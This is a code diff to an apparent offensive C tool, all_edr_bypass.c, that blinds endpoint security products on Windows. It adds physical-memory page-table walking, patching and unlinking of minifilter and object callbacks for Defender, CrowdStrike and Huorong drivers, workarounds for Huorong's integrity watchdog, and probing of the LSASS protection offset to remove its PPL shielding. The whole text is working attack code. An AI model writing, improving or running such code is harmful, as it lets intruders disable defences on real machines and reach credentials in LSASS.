@@ -1,4 +1,4 @@
-/*
+﻿/*
  * all_edr_bypass.c — Combined EDR kernel callback bypass
  *
  * Single executable. Runs all 6 bypass modules in optimal order:
@@ -120,11 +120,30 @@ static int phys_write(uint64_t pa, const void *data, uint32_t sz)
  * PML4 is typically in the first 4 MB.
  * ─────────────────────────────────────────────────────────────────────── */
 static uint64_t g_kernel_cr3=0;
+static int      g_paging_5l =0; /* 1 = 5-level paging (LA57): CR3→PML5→PML4→... */
 
-static uint64_t find_kernel_cr3(void)
+/* Count present entries in kernel half of PML4 (slots 0x100..0x1FE, excluding self-ref).
+ * Full KernelCR3: maps pool + drivers + hal = many entries (typically 10-30+).
+ * KPTI shadow UserCR3: maps only minimal kernel stub = very few entries (1-3).
+ * Threshold of 4 reliably distinguishes them. */
+static int pml4_kernel_entry_count(const uint8_t *pg4k, int self_ref_idx)
 {
+    int n = 0;
+    for (int i = 0x100; i < 0x1FF; i++) {
+        if (i == self_ref_idx) continue;
+        uint64_t e = *(uint64_t*)(pg4k + i*8);
+        if (e & 1) n++;
+    }
+    return n;
+}
+
+static uint64_t find_kernel_cr3(uint64_t nt_va)
+{
+    (void)nt_va; /* detection now done in detect_paging_mode() after CR3 is found */
+    static uint8_t s_pg[4096];
+
     /* Pass 1 — fast: check only slot 0x1ED (standard Windows 10 / early 11).
-     * One 8-byte read per 4 KB page, searches 0-256 MB. */
+     * Validate with kernel-entry count to reject KPTI shadow UserCR3. */
     for(int ri=0;ri<g_nranges;ri++){
         if(g_ranges[ri].base>=0x10000000ULL) continue;
         uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
@@ -132,45 +151,128 @@ static uint64_t find_kernel_cr3(void)
         for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
             uint64_t e=0;
             if(!phys_read(pa+0x1ED*8,&e,8)) continue;
-            if((e&1)&&(e&0x000FFFFFFFFFF000ULL)==pa) return pa;
+            if(!((e&1)&&(e&0x000FFFFFFFFFF000ULL)==pa)) continue;
+            if(!phys_read(pa,s_pg,4096)) continue;
+            if(pml4_kernel_entry_count(s_pg,0x1ED) < 4) continue;
+            return pa;
         }
     }
 
-    /* Pass 2 — thorough: read entire 4 KB page and check all 512 PML4 slots.
-     * Windows 11 22H2+ randomises the self-reference index (KASLR for PML4),
-     * so it can be anywhere in the upper-half (slots 0x100-0x1FF).
-     * Limit to first 64 MB — early-boot allocations always live there. */
-    static uint8_t s_pg[4096];
+    /* Pass 2 — thorough: randomised self-ref slot (Win11 22H2+), first 64 MB. */
     for(int ri=0;ri<g_nranges;ri++){
-        if(g_ranges[ri].base>=0x4000000ULL) continue; /* above 64 MB */
+        if(g_ranges[ri].base>=0x4000000ULL) continue;
         uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
         if(re>0x4000000ULL) re=0x4000000ULL;
         for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
             if(!phys_read(pa,s_pg,4096)) continue;
-            for(int idx=0x100;idx<0x200;idx++){          /* kernel-half only */
+            for(int idx=0x100;idx<0x200;idx++){
                 uint64_t e=*(uint64_t*)(s_pg+idx*8);
                 if(!(e&1)) continue;
-                if((e&0x000FFFFFFFFFF000ULL)==pa) return pa;
+                if((e&0x000FFFFFFFFFF000ULL)!=pa) continue;
+                if(pml4_kernel_entry_count(s_pg,idx) < 4) continue;
+                return pa;
             }
         }
     }
     return 0;
 }
 
-/* 4-level page table walk: kernel VA → physical address (0 = not mapped) */
+/* Find kernel CR3 by scanning physical RAM for System EPROCESS (PID=4) and reading
+ * EPROCESS.DirectoryTableBase at +0x28.  More reliable than self-ref PML4 scan because:
+ *   • Works regardless of where the PML4/PML5 page is in physical RAM (no 64MB limit)
+ *   • Works for both 4-level and 5-level paging
+ *   • Not affected by false-positive self-referencing pages
+ * Must be called AFTER g_ranges is populated.  Uses EP_OFF_PID / EP_OFF_NAME constants
+ * that are defined later — we forward-declare the values literally to avoid reordering. */
+static uint64_t find_cr3_from_system_eprocess(void)
+{
+    /* EP offsets (same values as the #defines below, used here before they're visible) */
+    const uint32_t pid_off  = 0x440u;
+    const uint32_t name_off = 0x5A8u;
+    const uint32_t dtb_off  = 0x28u;  /* EPROCESS.DirectoryTableBase — stable across versions */
+    const uint32_t ep_scan  = 0x5C0u; /* bytes to read per candidate */
+
+    /* Use a 256KB local chunk for scanning — matches CHUNK_SZ but doesn't depend on g_chunk */
+    static uint8_t scan_buf[0x40000];
+    static uint8_t ep[0x600];
+    for(int ri=0;ri<g_nranges;ri++){
+        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
+        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=sizeof(scan_buf)){
+            uint64_t csz=re-cpa; if(csz>sizeof(scan_buf)) csz=sizeof(scan_buf);
+            if(!phys_read(cpa,scan_buf,(uint32_t)csz)) continue;
+            /* Stride 8: EPROCESS is 8-byte aligned; start at pid_off to avoid underflow */
+            for(uint64_t off=pid_off;off+ep_scan<=csz;off+=8){
+                /* Quick PID=4 check at +pid_off */
+                if(*(uint64_t*)(scan_buf+off)!=4ULL) continue;
+                /* Candidate EPROCESS base = cpa + off - pid_off */
+                uint64_t ep_pa=cpa+off-pid_off;
+                if(!phys_read(ep_pa,ep,ep_scan)) continue;
+                /* Verify: PID==4 and ImageFileName=="System" */
+                if(*(uint64_t*)(ep+pid_off)!=4ULL) continue;
+                if(memcmp(ep+name_off,"System",6)!=0) continue;
+                /* Read DirectoryTableBase */
+                uint64_t dtb=*(uint64_t*)(ep+dtb_off);
+                if(!dtb||(dtb&0xFFF)||dtb>0x200000000000ULL) continue;
+                printf("    System EPROCESS PA=0x%llX  DTB=0x%llX\n",
+                       (unsigned long long)ep_pa,(unsigned long long)dtb);
+                return dtb;
+            }
+        }
+    }
+    return 0;
+}
+
+/* Page-table walk: kernel VA → physical address (0 = not mapped).
+ * Supports both 4-level (LA48) and 5-level (LA57) paging.
+ * g_paging_5l=1 → CR3 points to PML5; add one extra indirection before PML4. */
 static uint64_t va_to_pa(uint64_t va)
 {
     if(!g_kernel_cr3) return 0;
+    uint64_t root=g_kernel_cr3, e=0;
+    if(g_paging_5l){
+        uint64_t pml5i=(va>>48)&0x1FF;
+        if(!phys_read(root+pml5i*8,&e,8)||!(e&1)) return 0;
+        root=e&0x000FFFFFFFFFF000ULL; /* PML4 table PA */
+        e=0;
+    }
     uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
     uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
-    uint64_t e=0;
-    if(!phys_read(g_kernel_cr3+pml4i*8,&e,8)||!(e&1)) return 0;
+    if(!phys_read(root+pml4i*8,&e,8)||!(e&1)) return 0;
     if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdpi*8,&e,8)||!(e&1)) return 0;
     if(e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF); /* 1 GB */
     if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdi*8,&e,8)||!(e&1)) return 0;
     if(e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);  /* 2 MB */
     if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pti*8,&e,8)||!(e&1)) return 0;
     return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
+}
+
+/* After find_kernel_cr3(), determine if CR3 is PML5 (5-level / LA57).
+ * Strategy: with ntoskrnl VA known, try 4-level walk. If PML4 entry not present,
+ * try as PML5 — read PML5[pml5i] → PML4, then check PML4[pml4i] present.
+ * Sets g_paging_5l and updates g_kernel_cr3 usage accordingly. */
+static void detect_paging_mode(uint64_t nt_va)
+{
+    if(!g_kernel_cr3||!nt_va) return;
+    uint64_t pml4i=(nt_va>>39)&0x1FF;
+    uint64_t e4=0;
+    phys_read(g_kernel_cr3+pml4i*8,&e4,8);
+    if(e4&1){ g_paging_5l=0; printf("    Paging: 4-level (LA48)\n"); return; }
+
+    /* PML4 entry not present → try 5-level */
+    uint64_t pml5i=(nt_va>>48)&0x1FF;
+    uint64_t e5=0;
+    phys_read(g_kernel_cr3+pml5i*8,&e5,8);
+    if(!(e5&1)){ printf("    [!] Paging detection failed\n"); return; }
+    uint64_t pml4_pa=e5&0x000FFFFFFFFFF000ULL;
+    e4=0; phys_read(pml4_pa+pml4i*8,&e4,8);
+    if(e4&1){
+        g_paging_5l=1;
+        printf("    Paging: 5-level (LA57) — PML5 @ 0x%llX  PML4 @ 0x%llX\n",
+               (unsigned long long)g_kernel_cr3,(unsigned long long)pml4_pa);
+    } else {
+        printf("    [!] Paging detection inconclusive — 5-level PML4[0x%llX] not present\n",
+               (unsigned long long)pml4i);
+    }
 }
 
 /* Module list */
@@ -216,6 +318,16 @@ static const char *va_to_driver_ex(uint64_t va,uint64_t *rva)
 { for(int i=1;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){ if(rva)*rva=va-g_mods[i].base; return g_mods[i].name; } return NULL; }
 static int va_in_any_module(uint64_t va)
 { for(int i=0;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return 1; return 0; }
+/* Detect Huorong: any of the three Huorong drivers present in module list.
+ * Used to skip operations that would trigger sysdiag.sys integrity check. */
+static int huorong_is_active(void)
+{
+    static const char *hr[]={"sysdiag.sys","hrdevmon.sys","hrwfpdrv.sys",NULL};
+    for(int i=0;i<g_nmods;i++)
+        for(int j=0;hr[j];j++)
+            if(_stricmp(g_mods[i].name,hr[j])==0) return 1;
+    return 0;
+}
 
 /* Driver classification */
 typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;
@@ -414,6 +526,62 @@ static uint64_t find_driver_pa_by_func(const char *drv, uint64_t func_va, uint64
     return 0;
 }
 
+/* Resolve full disk path of a kernel module via NtQuerySystemInformation module list.
+ * Handles \SystemRoot\, \??\, and raw paths. Returns 1 on success. */
+static int find_module_disk_path(const char *drv_name, char *out, int maxsz)
+{
+    MOD_LIST *ml = get_module_list();
+    if (!ml) return 0;
+    int found = 0;
+    for (ULONG i = 0; i < ml->NumberOfModules && !found; i++) {
+        const char *fn = ml->Modules[i].FullPathName + ml->Modules[i].OffsetToFileName;
+        if (_stricmp(fn, drv_name) != 0) continue;
+        const char *fp = ml->Modules[i].FullPathName;
+        if (_strnicmp(fp, "\\SystemRoot\\", 12) == 0) {
+            char wd[MAX_PATH]; GetWindowsDirectoryA(wd, sizeof wd);
+            snprintf(out, maxsz, "%s\\%s", wd, fp+12);
+        } else if (_strnicmp(fp, "\\??\\", 4) == 0) {
+            strncpy(out, fp+4, maxsz-1); out[maxsz-1]='\0';
+        } else {
+            strncpy(out, fp, maxsz-1); out[maxsz-1]='\0';
+        }
+        found = (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES);
+    }
+    free(ml);
+    return found;
+}
+
+/* find_driver_pa using full module path (for drivers in non-standard locations). */
+static uint64_t find_driver_pa_by_modpath(const char *drv_name)
+{
+    char path[MAX_PATH]; if(!find_module_disk_path(drv_name,path,sizeof path)) return 0;
+    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+    if(hf==INVALID_HANDLE_VALUE) return 0;
+    uint8_t hdr[0x200]={0}; DWORD rd=0; ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);
+    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
+    uint32_t po=*(uint32_t*)(hdr+0x3C); if(po+12>rd||*(uint32_t*)(hdr+po)!=0x00004550) return 0;
+    uint16_t mach=*(uint16_t*)(hdr+po+4); uint32_t ts=*(uint32_t*)(hdr+po+8);
+    uint64_t lp=0;
+    for(int ri=0;ri<g_nranges;ri++){
+        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
+        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
+            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
+            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
+            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
+            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
+                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
+                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C); if(peo+12>csz-off) continue;
+                if(*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
+                if(*(uint16_t*)(g_chunk+off+peo+4)!=mach) continue;
+                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
+                printf("      Found %s at PA=0x%016llX (modpath)\n",drv_name,(unsigned long long)(cpa+off));
+                return cpa+off;
+            }
+        }
+    }
+    printf("      \n"); return 0;
+}
+
 /* Per-driver PA cache — prevents 4x physical scan for same driver (e.g. WdFilter 4 groups) */
 #define PA_CACHE_MAX 64
 static struct{char n[64];uint64_t pa;}g_pa_cache[PA_CACHE_MAX]; static int g_pa_n=0;
@@ -421,6 +589,9 @@ static uint64_t find_driver_pa_cached(const char *drv)
 {
     for(int i=0;i<g_pa_n;i++) if(_stricmp(g_pa_cache[i].n,drv)==0) return g_pa_cache[i].pa;
     uint64_t pa=find_driver_pa(drv);
+    /* Note: modpath fallback deliberately NOT here — MZ+timestamp can find stale/wrong
+     * copies in physical RAM (ELAM, WinSxS duplicates). Prologue scan in flt_apply_edr
+     * is more reliable. Modpath used only for sysdiag which has no standard path. */
     if(pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,drv,63);g_pa_cache[g_pa_n++].pa=pa;}
     return pa;
 }
@@ -471,7 +642,10 @@ static const char *g_edr_list[]={
     /* Windows Defender / Microsoft ATP */
     "WdFilter.sys","WdNisDrv.sys","WdBoot.sys","wddevflt.sys","MpFilter.sys",
     "SenseCncProxy.sys","SenseIR.sys","MsSecFlt.sys",
-    /* Huorong (火绒) */
+    /* Huorong (hrwfpdrv=WFP NIDS; hrdevmon=hardware device monitor only)
+     * sysdiag.sys = MAIN ENGINE but has self-protection (TrampoLib + integrity thread):
+     * zeroing its callbacks triggers BSOD. Needs IDA analysis before safe bypass.
+     * DO NOT add sysdiag.sys here until self-protection is understood. */
     "hrdevmon.sys","hrwfpdrv.sys",
     /* CrowdStrike */
     "csagent.sys","csdevicecontrol.sys","csimp.sys",
@@ -631,10 +805,29 @@ static void wk_scan_driver(const char *name, uint64_t drv_pa, uint64_t drv_va, u
     }
 }
 
+/* Set to 1 after kill_sysdiag_watchdog() succeeds.
+ * Unlocks: sysdiag FLT Method A, wk code patch for sysdiag-protected drivers, PPL write. */
+static int g_sysdiag_wd_killed = 0;
+
+/* Drivers whose code is monitored by sysdiag.sys integrity thread.
+ * Patching their .text triggers sysdiag KeBugCheckEx → BSOD.
+ * hrdevmon/hrwfpdrv: init callbacks already registered (patches useless anyway). */
+static int wk_is_sysdiag_protected(const char *drv)
+{
+    static const char *prot[]={
+        "sysdiag.sys","hrdevmon.sys","hrwfpdrv.sys",NULL};
+    for(int i=0;prot[i];i++) if(_stricmp(drv,prot[i])==0) return 1;
+    return 0;
+}
 static int wk_apply(void)
 {
     int ok=0;
     for(int i=0;i<g_wk_n;i++){
+        /* Skip Huorong drivers if watchdog still active — sysdiag monitors their code pages */
+        if(wk_is_sysdiag_protected(g_wk[i].drv) && !g_sysdiag_wd_killed){
+            printf("      SKIP %s (sysdiag-protected, watchdog active)\n",g_wk[i].drv);
+            continue;
+        }
         if(phys_write(g_wk[i].call_pa,WKPATCH,6)){
             uint8_t rb[6]={0}; phys_read(g_wk[i].call_pa,rb,6);
             if(memcmp(rb,WKPATCH,6)==0){g_wk[i].patched=1;ok++;}
@@ -812,6 +1005,8 @@ static int ob_apply_edr(void)
     int ok=0;
     for(int i=0;i<g_ob_n;i++){
         ObEntry *e=&g_ob[i];
+        /* sysdiag OB zeroing ALSO triggers integrity check BSOD — skip sysdiag for OB too.
+         * sysdiag monitors code, FLT list, FLT ptrs, AND OB callback entries. */
         if(!is_edr_target(e->drv)) continue;
         /* EDRSandblast technique 1: clear the Enabled flag in OB_CALLBACK_ENTRY.
          * Fallback to zeroing PreOperation pointer if enabled_pa is unusable. */
@@ -848,6 +1043,39 @@ static void ob_restore(void)
  * §5  MODULE: FLT MINIFILTER
  * ══════════════════════════════════════════════════════════════════════ */
 
+/* VA of a 'xor eax,eax; ret' stub inside ntoskrnl.
+ * Used by Method A.6 to replace sysdiag's callback ptrs with a VALID function
+ * that returns 0 (FLT_PREOP_SUCCESS_WITH_CALLBACK / FLT_POSTOP_FINISHED_PROCESSING).
+ * Writing NULL (0) causes BSOD: FltMgr does NOT null-check dispatch ptrs before calling. */
+static uint64_t g_flt_stub_va = 0;
+
+
+/* Scan ntoskrnl disk PE executable sections for 'xor eax,eax; ret' (0x31 0xC0 0xC3).
+ * Returns ntoskrnl VA of first match, 0 if not found. */
+static uint64_t flt_find_stub_va(const uint8_t *pe_buf, DWORD pe_sz, uint64_t nt_va)
+{
+    static const uint8_t P[3]={0x31,0xC0,0xC3};
+    if(pe_sz<0x40) return 0;
+    uint32_t pe_off=*(uint32_t*)(pe_buf+0x3C);
+    if(pe_off+0x18>(uint32_t)pe_sz) return 0;
+    uint16_t nsec=*(uint16_t*)(pe_buf+pe_off+0x06);
+    uint16_t oph =*(uint16_t*)(pe_buf+pe_off+0x14);
+    uint32_t sec0=pe_off+0x18+(uint32_t)oph;
+    for(uint16_t s=0;s<nsec&&sec0+0x28<=(uint32_t)pe_sz;s++,sec0+=0x28){
+        uint32_t vaddr =*(uint32_t*)(pe_buf+sec0+0x0C);
+        uint32_t rawoff=*(uint32_t*)(pe_buf+sec0+0x14);
+        uint32_t rawsz =*(uint32_t*)(pe_buf+sec0+0x10);
+        uint32_t chars =*(uint32_t*)(pe_buf+sec0+0x24);
+        if(!(chars&0x20000000)) continue; /* skip non-executable */
+        if(!rawoff||!rawsz||rawoff>=(uint32_t)pe_sz) continue;
+        if(rawoff+rawsz>(uint32_t)pe_sz) rawsz=(uint32_t)pe_sz-rawoff;
+        for(uint32_t i=0;i+3<=rawsz;i++)
+            if(pe_buf[rawoff+i]==P[0]&&pe_buf[rawoff+i+1]==P[1]&&pe_buf[rawoff+i+2]==P[2])
+                return nt_va+(uint64_t)vaddr+(uint64_t)i;
+    }
+    return 0;
+}
+
 #define FLT_MAX_RAW 16384
 #define FLT_MAX_GRP 64
 #define FLT_MAX_NODES 96
@@ -863,6 +1091,7 @@ typedef struct {
     uint64_t ulpf_pa, ulnb_pa;      /* PA of PREV.Flink and NEXT.Blink for restore */
     uint64_t ulpf_orig, ulnb_orig;  /* original values saved before unlink */
     int      unlinked;
+    int      zeroed;                 /* A.6: preop/postop ptrs zeroed in FltMgr pool */
 } FltNode;
 typedef struct {
     uint64_t filter_va; char driver[64]; DrvClass cls;
@@ -976,26 +1205,42 @@ static int flt_apply_edr(void)
 
     for(int gi=0;gi<g_flt_n_grp;gi++){
         FltGroup *grp=&g_flt_grp[gi];
-        if(grp->cls!=DRV_OTHER) continue;
-        if(!is_edr_target(grp->driver)) continue;
+        /* sysdiag.sys is Huorong's main AV engine but shares its name with a Windows
+         * system diagnostic component listed in SYS[] whitelist → classify_driver()
+         * returns DRV_SYSTEM → cls check below would skip it. Override with is_sysdiag
+         * so Huorong's sysdiag.sys gets processed even when cls==DRV_SYSTEM. */
+        int is_sysdiag = (_stricmp(grp->driver,"sysdiag.sys")==0);
+        if(grp->cls!=DRV_OTHER && !is_sysdiag) continue;
+        if(!is_edr_target(grp->driver) && !is_sysdiag) continue;
 
         /* If same driver was fully processed by an earlier group, just mark patched */
         int already=0;
         for(int k=0;k<ndone;k++) if(_stricmp(done[k],grp->driver)==0){already=1;break;}
         if(already){grp->patched=1;continue;}
 
-        /* collect unique preop VAs */
-        uint64_t uniq[FLT_MAX_NODES]; int nu=0;
+        /* Collect unique PreOp VAs only.
+         * Collect both PreOp and PostOp: WdFilter scans EICAR content in PostOp
+         * IRP_MJ_CLEANUP (after file closed), not in PreOp. Must patch both. */
+        uint64_t uniq[FLT_MAX_NODES*2]; int nu=0;
         for(int i=0;i<grp->n;i++){
-            int f=0; for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
-            if(!f&&nu<FLT_MAX_NODES) uniq[nu++]=grp->nodes[i].preop;
+            /* PreOp */
+            {int f=0;for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
+             if(!f&&nu<FLT_MAX_NODES*2) uniq[nu++]=grp->nodes[i].preop;}
+            /* PostOp */
+            if(grp->nodes[i].postop){
+                int f=0;for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].postop){f=1;break;}
+                if(!f&&nu<FLT_MAX_NODES*2) uniq[nu++]=grp->nodes[i].postop;
+            }
         }
         uint64_t drv_va=0;
         for(int m=1;m<g_nmods;m++) if(_stricmp(g_mods[m].name,grp->driver)==0){drv_va=g_mods[m].base;break;}
         /* use cached PA to avoid repeated full physical scan for same driver */
         int ok=0;
 
-        if(g_kernel_cr3){
+        if(g_kernel_cr3 && (!is_sysdiag || g_sysdiag_wd_killed)){
+            /* sysdiag: skip unless watchdog KDPC already redirected ([0/8]).
+             * With watchdog neutered, Method A (LIST_ENTRY unlink) is safe:
+             * the integrity check timer fires but DPC returns immediately. */
             /* ── Method A: unlink callback nodes from FltMgr's per-IRP lists ─
              * Traverses each unique node, finds PREV.Flink and NEXT.Blink via
              * page-table walk, then stitches PREV→NEXT (skipping EDR's node).
@@ -1030,19 +1275,48 @@ static int flt_apply_edr(void)
                        grp->driver);
         }
 
-        if(!ok){
-            /* ── Method B fallback: patch PreOp prologue to xor eax,eax;ret ── */
-            uint64_t drv_pa=find_driver_pa_cached(grp->driver);
-            if(!drv_pa&&nu>0&&drv_va){
-                printf("    [!] MZ scan failed, trying prologue scan...\n");
-                for(int j=0;j<nu&&!drv_pa&&j<4;j++) drv_pa=find_driver_pa_by_func(grp->driver,uniq[j],drv_va);
-                if(drv_pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,grp->driver,63);g_pa_cache[g_pa_n++].pa=drv_pa;}
+        if(!ok && is_sysdiag){
+            if(!g_sysdiag_wd_killed)
+                printf("    sysdiag.sys: watchdog active — minifilter skipped (run [0/8] first)\n");
+            else
+                printf("    sysdiag.sys: watchdog killed but va_to_pa unavailable — unlink failed\n");
+        }
+        if(!ok && !is_sysdiag){
+            /* Method B.1: direct va_to_pa on each preop/postop VA.
+             * Code section VAs (in driver .text) are mapped differently from pool VAs.
+             * va_to_pa works for code VAs even when pool VAs fail (different PML4 entries).
+             * This covers ALL callbacks found by FLT scan, including PostOp for EICAR fix. */
+            if(g_kernel_cr3 && drv_va){
+                int vok=0;
+                for(int j=0;j<nu;j++){
+                    uint64_t fn_pa=va_to_pa(uniq[j]);
+                    if(!fn_pa) continue;
+                    /* Sanity: PA must be in physical range and not already patched */
+                    if(!pa_in_range(fn_pa,3)) continue;
+                    uint8_t cur[3]={0}; phys_read(fn_pa,cur,3);
+                    if(cur[0]==PATCH3[0]&&cur[1]==PATCH3[1]&&cur[2]==PATCH3[2]) {vok++;continue;}
+                    if(cur[0]==0||cur[0]==0xCC) continue; /* null/breakpoint — wrong addr */
+                    if(phys_write(fn_pa,PATCH3,3)) vok++;
+                }
+                if(vok>0){
+                    printf("    %s: %d/%d fn(s) patched (va_to_pa direct)\n",grp->driver,vok,nu);
+                    ok=vok;
+                }
             }
-            if(drv_pa){
-                for(int j=0;j<nu;j++) if(flt_patch_func(uniq[j],drv_pa,drv_va,grp->driver)) ok++;
-                if(ok) printf("    %s: %d/%d functions patched (fallback)\n",grp->driver,ok,nu);
-            } else {
-                printf("    [!] %s: driver PA not found — skipped\n",grp->driver);
+            /* Method B.2: prologue scan fallback if va_to_pa gave nothing */
+            if(!ok){
+                uint64_t drv_pa=find_driver_pa_cached(grp->driver);
+                if(!drv_pa&&nu>0&&drv_va){
+                    printf("    [!] MZ scan failed, trying prologue scan...\n");
+                    for(int j=0;j<nu&&!drv_pa&&j<4;j++) drv_pa=find_driver_pa_by_func(grp->driver,uniq[j],drv_va);
+                    if(drv_pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,grp->driver,63);g_pa_cache[g_pa_n++].pa=drv_pa;}
+                }
+                if(drv_pa){
+                    for(int j=0;j<nu;j++) if(flt_patch_func(uniq[j],drv_pa,drv_va,grp->driver)) ok++;
+                    if(ok) printf("    %s: %d/%d fn(s) patched (prologue scan)\n",grp->driver,ok,nu);
+                } else {
+                    printf("    [!] %s: driver PA not found — skipped\n",grp->driver);
+                }
             }
         }
 
@@ -1064,10 +1338,18 @@ static void flt_restore(void)
     for(int gi=0;gi<g_flt_n_grp;gi++){
         FltGroup *grp=&g_flt_grp[gi];
         for(int j=0;j<grp->n;j++){
-            FltNode *nd=&grp->nodes[j]; if(!nd->unlinked) continue;
-            phys_write(nd->ulpf_pa,&nd->ulpf_orig,8); /* restore PREV.Flink */
-            phys_write(nd->ulnb_pa,&nd->ulnb_orig,8); /* restore NEXT.Blink */
-            nd->unlinked=0;
+            FltNode *nd=&grp->nodes[j];
+            if(nd->unlinked){
+                phys_write(nd->ulpf_pa,&nd->ulpf_orig,8); /* restore PREV.Flink */
+                phys_write(nd->ulnb_pa,&nd->ulnb_orig,8); /* restore NEXT.Blink */
+                nd->unlinked=0;
+            }
+            /* Restore A.6 stub-redirected callback pointers */
+            if(nd->zeroed){
+                if(nd->preop_pa  && nd->preop)  phys_write(nd->preop_pa, &nd->preop, 8);
+                if(nd->postop_pa && nd->postop) phys_write(nd->postop_pa,&nd->postop,8);
+                nd->zeroed=0;
+            }
         }
     }
 }
@@ -1491,8 +1773,16 @@ static void ppl_detect_offsets(void)
     pfnRtlGetVersion fn = (pfnRtlGetVersion)
         GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
     if (fn) fn(&ov);
-    g_ep_off_prot = (ov.dwBuildNumber >= 26100) ? 0x4FA : 0x87A;
-    printf("    build %lu → OFF_PROT=0x%X (initial guess)\n",
+    /* Offsets from static rev of sysdiag.sys (Huorong watchdog driver):
+     *   build < 22000  (Win10 all)    : 0x878  (SignatureLevel) / 0x87A (Protection)
+     *   build 22000-22621 (Win11 21H2): 0x87A
+     *   build 22621+  (Win11 22H2)    : 0x884  ← confirmed in sysdiag binary
+     *   build 26100+  (Win11 24H2)    : 0x884 or higher (probe confirms)
+     * ppl_probe_offset_write_test() will refine via NtQIP ground-truth. */
+    if      (ov.dwBuildNumber >= 22621) g_ep_off_prot = 0x884;
+    else if (ov.dwBuildNumber >= 22000) g_ep_off_prot = 0x87A;
+    else                                g_ep_off_prot = 0x878;
+    printf("    build %lu → OFF_PROT=0x%X (initial guess, sysdiag-derived)\n",
            (unsigned long)ov.dwBuildNumber, g_ep_off_prot);
 }
 
@@ -1579,8 +1869,10 @@ static uint32_t ppl_probe_offset_write_test(void)
 {
     if (!g_lsass_prot_api) return 0;  /* not PPL, no need */
 
+    /* Candidates ordered by likelihood (sysdiag watchdog rev: 0x884=W11 22H2,
+     * 0x878=W10; 0x87C/0x880 guesses for W11 25H2 build 26200) */
     static const uint32_t cands[] = {
-        0x4FA, 0x87A, 0x6B0, 0x878, 0x880, 0x6FA, 0x7FA, 0x5FA, 0x4F8, 0
+        0x884, 0x87C, 0x880, 0x878, 0x87A, 0x6B0, 0x4FA, 0x6FA, 0x7FA, 0x5FA, 0
     };
 
     for (int ci = 0; cands[ci]; ci++) {
@@ -1690,13 +1982,22 @@ static void ppl_scan(uint32_t lsass_pid,
     printf("    NtQIP(Protection)=0x%02X\n", g_lsass_prot_api);
 
     if (g_lsass_prot_api) {
-        printf("    Probing Protection offset (write-test per candidate):\n");
-        uint32_t confirmed = ppl_probe_offset_write_test();
-        if (confirmed)
-            printf("    Protection offset CONFIRMED: 0x%X  prot_orig=0x%02X\n",
-                   g_ep_off_prot, g_lsass_ep.prot_orig);
-        else
-            printf("    [!] No offset confirmed — PPL bypass may fail\n");
+        if(huorong_is_active()){
+            /* sysdiag.sys watchdog BugChecks on any write to LSASS.Protection.
+             * Skip write-probe; use static build-derived offset (less accurate but safe).
+             * PPL bypass itself will also be skipped below for the same reason. */
+            printf("    [Huorong detected] skipping write-probe to avoid watchdog BugCheck\n");
+            printf("    Using static offset: 0x%X (build-derived, not probed)\n",g_ep_off_prot);
+            g_lsass_ep.prot_orig = g_lsass_prot_api;
+        } else {
+            printf("    Probing Protection offset (write-test per candidate):\n");
+            uint32_t confirmed = ppl_probe_offset_write_test();
+            if (confirmed)
+                printf("    Protection offset CONFIRMED: 0x%X  prot_orig=0x%02X\n",
+                       g_ep_off_prot, g_lsass_ep.prot_orig);
+            else
+                printf("    [!] No offset confirmed — PPL bypass may fail\n");
+        }
     } else {
         g_lsass_ep.prot_orig = 0;
     }
@@ -1823,6 +2124,98 @@ static void combined_pool_scan(void)
         }
     }
 cps_done:;
+}
+
+/* ══════════════════════════════════════════════════════════════════════
+ * §7b  SYSDIAG WATCHDOG DISABLE (KDPC redirect)
+ * ══════════════════════════════════════════════════════════════════════
+ * sysdiag.sys has a timer-based KDPC that:
+ *   1. Calls PsLookupProcessByProcessId(4 → LSASS pid)
+ *   2. Reads EPROCESS+0x884 and restores it to 0x41 if changed
+ *   3. Also monitors FLT callback lists and OB entries → KeBugCheckEx on tamper
+ * Strategy: scan physical RAM for KDPC structures (Type=0x13/0x1A) whose
